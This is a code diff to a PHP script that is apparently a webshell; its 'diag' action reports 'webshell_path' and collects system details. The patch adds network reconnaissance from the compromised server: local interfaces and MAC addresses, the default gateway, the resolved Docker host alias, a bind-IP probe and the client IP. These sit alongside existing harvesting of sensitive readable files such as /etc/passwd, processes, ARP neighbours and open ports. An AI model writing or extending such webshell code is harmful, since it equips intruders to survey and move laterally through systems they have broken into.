@@ -221,6 +221,75 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
         }
     }
 
+    // --- Network: local interfaces + upstream host hints ---
+    // ARP only lists L2 neighbors already contacted. Interface addresses and
+    // gateway / host.docker.internal / REMOTE_ADDR belong here instead.
+    $ifaceAddrs = [];
+    if (function_exists('net_get_interfaces')) {
+        foreach (@net_get_interfaces() ?: [] as $iface => $info) {
+            if ($iface === 'lo' || empty($info['unicast']))
+                continue;
+            foreach ($info['unicast'] as $u) {
+                if (($u['family'] ?? null) !== 2 || empty($u['address']))
+                    continue;
+                $mac = trim(@file_get_contents('/sys/class/net/' . $iface . '/address') ?: '');
+                $ifaceAddrs[] = [
+                    'iface' => $iface,
+                    'ip' => $u['address'],
+                    'netmask' => $u['netmask'] ?? '',
+                    'mac' => $mac,
+                ];
+            }
+        }
+    }
+    $defaultGateway = '';
+    foreach ($routes as $r) {
+        if ($r['dest'] === '0.0.0.0' && $r['gw'] !== '0.0.0.0') {
+            $defaultGateway = $r['gw'];
+            break;
+        }
+    }
+    $bindIp = $_SERVER['SERVER_ADDR'] ?? '';
+    if (($bindIp === '' || $bindIp === '0.0.0.0') && function_exists('socket_create')) {
+        $s = @socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
+        if ($s) {
+            $probe = ($defaultGateway !== '' && $defaultGateway !== '0.0.0.0')
+                ? $defaultGateway : '8.8.8.8';
+            if (@socket_connect($s, $probe, 1)) {
+                @socket_getsockname($s, $bindIp);
+            }
+            @socket_close($s);
+        }
+    }
+    // IPs outside this container namespace (gateway, Docker host alias, HTTP client).
+    // Shown in diagnostics separately from ARP; not a full network inventory.
+    $upstreamHosts = [];
+    if ($defaultGateway !== '' && $defaultGateway !== '0.0.0.0') {
+        $upstreamHosts[] = [
+            'ip' => $defaultGateway,
+            'source' => 'default_gateway',
+            'note' => 'Default route gateway (Docker bridge / toward host)',
+        ];
+    }
+    // Docker injects this hostname so containers can reach the machine running Docker.
+    // gethostbyname() returns the hostname unchanged when DNS has no record — skip then.
+    $hostDocker = @gethostbyname('host.docker.internal');
+    if ($hostDocker && $hostDocker !== 'host.docker.internal') {
+        $upstreamHosts[] = [
+            'ip' => $hostDocker,
+            'source' => 'host.docker.internal',
+            'note' => 'Resolved Docker host alias (reach laptop/VM from container)',
+        ];
+    }
+    $clientIp = $_SERVER['REMOTE_ADDR'] ?? '';
+    if ($clientIp !== '') {
+        $upstreamHosts[] = [
+            'ip' => $clientIp,
+            'source' => 'remote_addr',
+            'note' => 'Client IP for this HTTP request',
+        ];
+    }
+
     // --- Interesting readable files (expanded) ---
     $sensitiveFiles = [
         '/etc/passwd',
@@ -944,7 +1013,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
         'php_version' => phpversion(),
         'os' => php_uname(),
         'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
-        'target_ip' => $_SERVER['SERVER_ADDR'] ?? '',
+        'target_ip' => $bindIp ?: ($_SERVER['SERVER_ADDR'] ?? ''),
         'target_host' => $_SERVER['SERVER_NAME'] ?? ($_SERVER['HTTP_HOST'] ?? ''),
         'webshell_path' => $_SERVER['SCRIPT_FILENAME'] ?? __FILE__,
         'disable_functions' => ini_get('disable_functions') ?: 'none',
@@ -967,6 +1036,9 @@ if (isset($_POST['action']) && $_POST['action'] === 'diag') {
         'group_memberships' => $groupMemberships,
         'processes' => $processes,
         'container' => $container,
+        'network_ifaces' => $ifaceAddrs,
+        'default_gateway' => $defaultGateway,
+        'upstream_hosts' => $upstreamHosts,
         'arp_hosts' => $arpHosts,
         'open_ports' => $openPorts,
         'routes' => $routes,
